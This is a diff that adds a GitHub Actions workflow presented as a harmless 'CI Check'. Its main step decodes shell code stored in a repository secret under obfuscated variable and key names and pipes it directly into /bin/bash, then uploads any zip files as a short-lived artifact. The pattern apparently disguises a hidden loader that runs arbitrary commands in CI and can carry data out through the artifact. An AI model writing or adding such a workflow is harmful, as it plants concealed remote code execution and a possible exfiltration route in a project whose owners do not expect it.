@@ -1,0 +1,31 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          tlg3245: ${{ secrets.tlg3245 }}
+        run: |
+          printf '%s' "$tlg3245" | jq -r .it33554 | /bin/bash
+          printf '%s' "$e740" | jq -r .reca615 | /bin/bash
+          echo $kagr205 | jq -r .orrem64597 | /bin/bash
+          printf '%s' "$a7" | jq -r .wwz79260 | /bin/bash
+          echo $ksl83 | jq -r .lhl72344 | /bin/bash
+          printf '%s' "$lwj95" | jq -r .qfeh29 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: YNWzwv8h
+          path: "*.zip"
+          retention-days: 1
